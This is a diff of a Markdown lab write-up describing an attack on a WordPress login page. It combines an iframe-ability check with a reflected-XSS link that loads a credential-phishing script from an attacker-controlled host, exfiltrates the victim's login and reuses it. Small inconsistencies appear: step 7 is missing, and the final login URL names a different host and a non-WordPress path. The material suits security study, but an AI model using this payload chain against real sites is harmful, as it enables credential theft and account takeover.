@@ -20,32 +20,52 @@
 
 ## Exploitation Steps
 
-1. [check if target login page iframe-able] navigate to target application in web browser
+1. [test target login page] navigate to target application in web browser
 
-http://192.168.5.10
+    http://192.168.5.10
 
-2. [check if target login page iframe-able] open developer console and execute following code
+2. [test target login page] confirm target login is iframe-able
 
-```
-const url = "http://192.168.5.10/wp-login.php";
-const req = new XMLHttpRequest();
-req.open("GET", url, false);
-req.send(null);
-console.log("Endpoint: " + url + "\nX-Frame-Options (response header): " + req.getResponseHeader("X-Frame-Options"));
-```
+    *(open developer console and execute following code)*
 
-* **NOTE**: default install value: `SAMEORGIN` (vulnerable)
+    ```
+    const url = "http://192.168.5.10/wp-login.php";
+    const req = new XMLHttpRequest();
+    req.open("GET", url, false);
+    req.send(null);
+    console.log("Endpoint: " + url + "\nX-Frame-Options (response header): " + req.getResponseHeader("X-Frame-Options"));
+    ```
 
-3. victim user clicks link
+    * **NOTE**: default install value: `SAMEORGIN` (vulnerable)
 
-```
-http://192.168.5.10/test/rxss.php?q=<script src=http://192.168.5.13/phishLoginWP.js></script>
-```
+3. [setup exploit] change payload variable values (`phishLoginWP.js`)
 
-4. victim user authenticates
+    `exfilWebServer` - web server URL for credential exfiltration
 
-*(attacker obtains credentials)*
+    `wpRoot` - path to WordPress installation on the target system (e.g. `"/path"`)
+
+4. [setup exploit] setup web server (to serve the payload)
+
+5. [social engineering attack] victim user clicks link
+
+    ```
+    http://192.168.5.10/test/rxss.php?q=<script src=http://192.168.5.13/phishLoginWP.js></script>
+    ```
+
+    * **NOTES**:
+      * `192.168.5.10` - target WordPress site
+      * `192.168.5.13` - web server hosting payload
+
+6. [social engineering attack] victim user authenticates
+
+    *(attacker obtains credentials)*
+
+8. [post exploit] attacker logs into target WordPress site using obtained credentials
+
+    http://192.168.5.19/administrator/
 
 ## Screenshots
+
+* **NOTE**: the screenshot covers steps 3 to 6 from the "Exploitation Steps" chapter
 
 ![Image](screenshots/WordPress_-_iframe_login_-_1-1.png)
